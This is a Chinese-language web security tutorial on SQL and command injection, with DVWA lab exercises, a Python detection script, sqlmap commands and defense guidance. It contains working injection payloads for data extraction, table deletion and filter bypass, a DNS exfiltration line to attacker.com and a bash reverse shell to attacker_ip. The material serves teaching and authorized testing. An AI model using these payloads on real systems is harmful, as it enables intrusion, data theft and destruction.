# 02 注入攻击 —— SQL注入/命令注入

> **注入是Web安全中最经典、最高危的漏洞类型。**
> 理解了注入的本质，你就理解了大部分Web安全问题的核心：
> **用户输入被当成代码执行了。**

---

## 一、注入的本质：一句话讲透

```
注入 = 开发者把用户输入拼接进了代码（SQL/命令/HTML/...），
       用户精心构造输入，让拼接后的代码做了开发者没预料到的事。
```

**类比：**
```
老师让你填一个请假条：

正常学生写：          "张三因为感冒请假一天"
恶意学生写：          "张三因为感冒请假一天。另外，全班放假一周"

请假条模板是：         "___ 因为 ___ 请假 ___"
恶意输入在空格里塞了额外的"命令"，改变了整个句子的含义。

SQL注入就是这个道理。
```

---

## 二、SQL注入（SQLi）：最经典的注入

### 2.1 漏洞原理

**有漏洞的代码：**
```python
# 后端代码（Python示例）
username = request.form["username"]  # 用户输入
password = request.form["password"]

# 危险！直接把用户输入拼接进SQL语句
sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
result = db.execute(sql)
```

**正常登录时：**
```
用户输入：username=admin, password=123456

拼接后的SQL：
SELECT * FROM users WHERE username = 'admin' AND password = '123456'

→ 查找 username=admin 且 password=123456 的用户
→ 正常行为
```

**SQL注入时：**
```
用户输入：username=admin' OR 1=1 --, password=随便

拼接后的SQL：
SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password = '随便'

拆解分析：
  username = 'admin'     → 先闭合了引号
  OR 1=1                 → 永远为真，匹配所有行
  --                     → SQL注释符，后面的内容全部被注释掉
  ' AND password = '随便' → 被注释了，不执行

结果：返回所有用户 → 以第一个用户（通常是admin）身份登录
```

### 2.2 为什么这么危险

SQL注入不只是绕过登录，攻击者可以：

```
[1] 读取任意数据 —— 拖库
    ' UNION SELECT username, password FROM users --
    → 读出所有用户名和密码

[2] 修改数据
    '; UPDATE users SET role='admin' WHERE username='attacker' --
    → 把自己提升为管理员

[3] 删除数据
    '; DROP TABLE users --
    → 删掉整张用户表

[4] 读取系统文件（MySQL）
    ' UNION SELECT LOAD_FILE('/etc/passwd'), 2 --
    → 读服务器上的文件

[5] 执行系统命令（某些配置下）
    '; EXEC xp_cmdshell('whoami') --
    → 在服务器上执行操作系统命令
```

---

## 三、SQL注入分类与检测

### 3.1 按注入位置分

**GET参数注入（最常见）**
```
http://target.com/user?id=1
→ 测试：http://target.com/user?id=1'
→ 测试：http://target.com/user?id=1 OR 1=1
```

**POST参数注入**
```
POST /login
Body: username=admin'&password=123
→ 用Burp拦截POST请求，修改参数
```

**Cookie注入**
```
Cookie: user_id=1' OR 1=1 --
→ 有些开发者从Cookie中读参数但不过滤
```

**HTTP Header注入**
```
User-Agent: ' OR 1=1 --
X-Forwarded-For: ' OR 1=1 --
→ 有些系统把请求头存入数据库（日志、统计）
→ 容易被忽视
```

### 3.2 按回显方式分

**有回显注入（最容易发现和利用）**
```
页面直接显示查询结果
测试：输入 ' 看是否报错
利用：用 UNION SELECT 查询任意数据
```

**报错注入**
```
页面不显示数据，但显示数据库错误信息
例：You have an error in your SQL syntax near '''
利用：构造特殊SQL让错误信息中带出数据
```

**布尔盲注（Blind SQLi - Boolean）**
```
页面不显示数据也不报错，但行为有区别
例：id=1 AND 1=1 → 正常页面
    id=1 AND 1=2 → 空白页面或不同内容

利用：逐位猜测数据
  id=1 AND SUBSTRING(database(),1,1)='a' → 空白（不是a）
  id=1 AND SUBSTRING(database(),1,1)='d' → 正常（是d！）
  → 一个字符一个字符猜出数据库名
```

**时间盲注（Blind SQLi - Time）**
```
页面完全没有任何区别
利用：用延时函数判断条件是否为真
  id=1 AND IF(1=1, SLEEP(3), 0) → 响应延迟3秒（条件为真）
  id=1 AND IF(1=2, SLEEP(3), 0) → 立刻响应（条件为假）
  → 通过响应时间差判断
```

### 3.3 检测流程（实战步骤）

```
第1步：找到注入点
  所有接收参数的地方都可能是注入点：
  URL参数、POST数据、Cookie、HTTP头

第2步：初步探测
  在参数值后面加一个单引号 '
  观察响应：
  - 报SQL错误 → 很可能有注入
  - 页面异常（空白、500错误）→ 可能有注入
  - 正常返回 → 可能被过滤了，或者不是注入点

第3步：验证注入
  数字型参数：
    id=1 AND 1=1  → 正常（预期）
    id=1 AND 1=2  → 异常
    两次结果不同 → 确认注入

  字符型参数：
    name=admin' AND '1'='1  → 正常
    name=admin' AND '1'='2  → 异常
    两次结果不同 → 确认注入

第4步：确定数据库类型
  不同数据库语法不同：
    MySQL:   SELECT @@version
    MSSQL:   SELECT @@version
    Oracle:  SELECT banner FROM v$version
    SQLite:  SELECT sqlite_version()
    PostgreSQL: SELECT version()

第5步：提取数据
  确认注入后，逐步获取：
    数据库名 → 表名 → 列名 → 数据

  MySQL示例：
    获取数据库名：' UNION SELECT database(), 2 --
    获取所有表：  ' UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema=database() --
    获取列名：    ' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='users' --
    获取数据：    ' UNION SELECT username, password FROM users --
```

---

## 四、UNION注入详解（有回显时最强的手法）

### 4.1 原理

```sql
-- 正常查询
SELECT name, price FROM products WHERE id = 1

-- UNION注入：在原查询后面追加一个查询
SELECT name, price FROM products WHERE id = 1 UNION SELECT username, password FROM users

-- UNION的规则：前后两个SELECT的列数必须一样
-- 所以第一步是确定原查询的列数
```

### 4.2 完整利用步骤

```sql
-- 第1步：确定列数（用ORDER BY递增测试）
id=1 ORDER BY 1 --   → 正常
id=1 ORDER BY 2 --   → 正常
id=1 ORDER BY 3 --   → 正常
id=1 ORDER BY 4 --   → 报错！
→ 列数为3

-- 第2步：确定哪些列会显示在页面上
id=-1 UNION SELECT 1,2,3 --
→ 页面上显示了 2 和 3（第2、3列的位置可以用来回显数据）

-- 第3步：获取数据库信息
id=-1 UNION SELECT 1,database(),version() --
→ 显示数据库名和版本

-- 第4步：获取所有表名
id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database() --
→ 显示所有表名，如：users,products,orders

-- 第5步：获取users表的列名
id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users' --
→ 显示列名，如：id,username,password,email

-- 第6步：获取数据
id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users --
→ 显示所有用户名和密码，如：admin:5f4dcc3b,user1:e10adc39
```

---

## 五、命令注入（Command Injection）

### 5.1 原理

```python
# 有漏洞的代码：用户输入被拼接进系统命令
import os
ip = request.args.get("ip")
result = os.popen(f"ping -c 4 {ip}").read()
```

```
正常输入：ip=192.168.1.1
执行命令：ping -c 4 192.168.1.1
→ 正常

恶意输入：ip=192.168.1.1; cat /etc/passwd
执行命令：ping -c 4 192.168.1.1; cat /etc/passwd
→ 先执行ping，然后执行cat /etc/passwd
→ 读取到了系统文件！
```

### 5.2 命令分隔符

```bash
# Linux下的命令连接方式：
;       # 前面执行完再执行后面（不管是否成功）
&&      # 前面成功才执行后面
||      # 前面失败才执行后面
|       # 管道，前面的输出作为后面的输入
`cmd`   # 反引号，先执行里面的命令
$(cmd)  # 同反引号

# 测试payload：
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami       # 如果ping不通才执行
`whoami`
$(whoami)

# Windows下：
127.0.0.1 & whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
```

### 5.3 盲注命令注入

```
页面不显示命令输出时：

方法1：时间延迟
  127.0.0.1; sleep 5       → 响应延迟5秒 → 确认命令执行了

方法2：DNS外带
  127.0.0.1; nslookup attacker.com    → 在攻击者的DNS服务器上能看到请求

方法3：反弹Shell（高级，渗透测试用）
  127.0.0.1; bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
```

---

## 六、注入防御（理解防御才能更好地测试绕过）

### 6.1 正确的防御：参数化查询

```python
# 错误的：字符串拼接
sql = f"SELECT * FROM users WHERE username = '{username}'"

# 正确的：参数化查询（预编译语句）
sql = "SELECT * FROM users WHERE username = %s"
cursor.execute(sql, (username,))
# 数据库会把 username 严格当作"数据"，而不是"SQL代码"
# 即使输入 ' OR 1=1 --，也只会当作一个奇怪的用户名来查询
```

```java
// Java 预编译
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ?");
stmt.setString(1, username);
```

### 6.2 其他防御措施

```
输入验证：
  - 白名单验证（只允许数字、字母等）
  - 长度限制
  - 类型检查（期望数字就检查是不是数字）

最小权限：
  - 数据库账户不要用root
  - 只给必要的权限（SELECT不需要DELETE权限）

WAF（Web应用防火墙）：
  - 拦截包含SQL关键字的请求
  - 但可以被绕过（编码、变形、分块传输等）

错误处理：
  - 不要把数据库错误直接返回给用户
  - 用通用的错误页面
```

### 6.3 常见绕过技巧（理解这些才知道怎么测）

```sql
-- 关键字被过滤：
SeLeCt          -- 大小写混合
SEL/**/ECT      -- 注释分割
CONCAT('SEL','ECT')  -- 字符串拼接

-- 空格被过滤：
SELECT/**/username/**/FROM/**/users    -- 用注释替代空格
SELECT\tusername\tFROM\tusers          -- 用Tab替代
SELECT(username)FROM(users)            -- 用括号

-- 引号被过滤：
WHERE id = 0x61646D696E    -- 十六进制编码 = 'admin'
WHERE id = CHAR(97,100,109,105,110)  -- CHAR函数

-- UNION被过滤：
id=1 && (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- 报错注入，不用UNION也能提取数据

-- 双写绕过（过滤器只替换一次）：
selselectect → select（过滤器去掉了中间的select，剩下的拼起来还是select）
```

---

## 七、动手实践

### 实践1：DVWA SQL注入（Low级别）

```
1. 登录DVWA → 左边菜单 → DVWA Security → 设为Low
2. 进入 SQL Injection 页面
3. 正常输入：1 → 观察返回
4. 输入单引号：1' → 观察错误
5. 逐步注入：

   获取列数：
   1' ORDER BY 1 #        → 正常
   1' ORDER BY 2 #        → 正常
   1' ORDER BY 3 #        → 报错 → 有2列

   确认回显位置：
   -1' UNION SELECT 1,2 #

   获取数据库名和版本：
   -1' UNION SELECT database(), version() #

   获取表名：
   -1' UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() #

   获取users表列名：
   -1' UNION SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' #

   获取用户名和密码：
   -1' UNION SELECT user, password FROM users #

6. 拿到密码哈希后，在线查询MD5解密
```

### 实践2：DVWA命令注入（Low级别）

```
1. 进入 Command Injection 页面
2. 正常输入：127.0.0.1 → 执行ping
3. 注入命令：
   127.0.0.1; whoami
   127.0.0.1; cat /etc/passwd
   127.0.0.1; ls -la /var/www/html
   127.0.0.1; id

4. 思考：这些命令在真实环境中能造成什么危害？
```

### 实践3：用Python自动化SQL注入检测

```python
"""简单的SQL注入检测脚本"""
import requests

def test_sqli(url, param_name, base_value="1"):
    """测试一个参数是否存在SQL注入"""
    payloads = [
        ("单引号", f"{base_value}'"),
        ("双引号", f'{base_value}"'),
        ("布尔真", f"{base_value} AND 1=1"),
        ("布尔假", f"{base_value} AND 1=2"),
        ("注释", f"{base_value}' --"),
        ("OR注入", f"{base_value}' OR '1'='1"),
        ("时间盲注", f"{base_value}' AND SLEEP(3) --"),
    ]

    # 先获取正常响应作为基准
    normal_resp = requests.get(url, params={param_name: base_value}, timeout=10)
    normal_length = len(normal_resp.text)
    normal_status = normal_resp.status_code

    print(f"基准响应: 状态码={normal_status}, 长度={normal_length}\n")

    for name, payload in payloads:
        try:
            import time
            start = time.time()
            resp = requests.get(url, params={param_name: payload}, timeout=15)
            elapsed = time.time() - start

            status = resp.status_code
            length = len(resp.text)
            diff = abs(length - normal_length)

            indicators = []
            if status == 500:
                indicators.append("500错误!")
            if diff > 50:
                indicators.append(f"长度差异:{diff}")
            if elapsed > 4:
                indicators.append(f"延迟:{elapsed:.1f}s!")
            if any(kw in resp.text.lower() for kw in ["sql", "syntax", "error", "mysql", "warning"]):
                indicators.append("包含SQL错误关键字!")

            flag = " ← 可疑!" if indicators else ""
            detail = " | ".join(indicators) if indicators else "正常"
            print(f"  [{name}] 状态:{status} 长度:{length} 耗时:{elapsed:.1f}s → {detail}{flag}")

        except requests.exceptions.Timeout:
            print(f"  [{name}] 超时! ← 可能存在时间盲注!")
        except Exception as e:
            print(f"  [{name}] 错误: {e}")

# 使用示例（对DVWA测试）
# test_sqli("http://localhost:8081/vulnerabilities/sqli/", "id")
```

### 实践4：用sqlmap自动化（了解工具）

```bash
# sqlmap是SQL注入自动化工具

# 基本用法：测试GET参数
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=你的session; security=low" \
  --batch

# 获取数据库名
sqlmap -u "..." --cookie="..." --dbs

# 获取表名
sqlmap -u "..." --cookie="..." -D dvwa --tables

# 获取数据
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump

# 注意：
# - sqlmap很强大但很"吵"（会发大量请求）
# - 正式测试前先手工确认注入存在
# - 只在授权范围内使用
```

---

## 八、注入漏洞检查清单

```
每个输入点（参数/Cookie/Header）都应该测试：

基础检测：
  □ 单引号 ' → 是否报SQL错误
  □ 双引号 " → 是否报错
  □ 分号 ; → 是否报错
  □ 注释符 -- 或 # → 是否影响查询
  □ 布尔测试 AND 1=1 vs AND 1=2 → 响应是否不同

SQL注入确认：
  □ ORDER BY递增 → 确定列数
  □ UNION SELECT → 是否可以回显数据
  □ SLEEP() → 是否存在时间盲注

命令注入检测：
  □ ; whoami → 是否执行
  □ | id → 管道注入
  □ && id → 条件执行
  □ `whoami` → 反引号注入
  □ $(whoami) → 替换注入

绕过测试（如果基础payload被拦截）：
  □ 大小写变换
  □ URL编码
  □ 注释分割
  □ 双写绕过
```

---

## 九、自测清单

- [ ] 能用自己的话解释注入攻击的本质？
- [ ] SQL注入的完整利用流程（从发现到提取数据）？
- [ ] UNION注入的前提条件和步骤？
- [ ] 什么是盲注？布尔盲注和时间盲注的区别？
- [ ] 命令注入常用的分隔符有哪些？
- [ ] 参数化查询为什么能防SQL注入？
- [ ] 能在DVWA上完成一次完整的SQL注入（Low级别）？
- [ ] 常见的绕过技巧有哪些？

---

> **下一模块：** [03 XSS攻击](../03-xss/README.md) —— 跨站脚本的前世今生
